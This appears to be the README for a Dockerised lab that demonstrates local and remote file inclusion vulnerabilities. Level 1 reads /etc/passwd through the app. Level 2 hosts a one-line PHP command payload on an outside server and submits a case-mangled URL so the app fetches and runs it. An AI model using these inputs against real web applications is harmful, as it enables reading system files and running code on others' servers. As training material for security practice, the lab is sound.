File Inclusion
=============
This demo demonstrates a simple LFI/RFI vulnerability.

Build and run the Dockerfile:

```bash
$ docker build -t fi-demo .
$ docker run -p 3002:3002 fi-demo
```

## Level 1
1. Submit: ``/etc/passwd``
2. /etc/passwd contents will be outputted.

## Level 2
1. Make a file called pwn.php with the following contents: ``<?php system("id");?>``
2. Host a webserver on any port.
3. Submit ``hTtps:///your_server:PORT/pwn.php`` (You can also just use ``hTtps:///google.com`` instead.)
4. Then ``pwn.php`` will be executed, displaying ``id``

*More levels will be added in the future.*

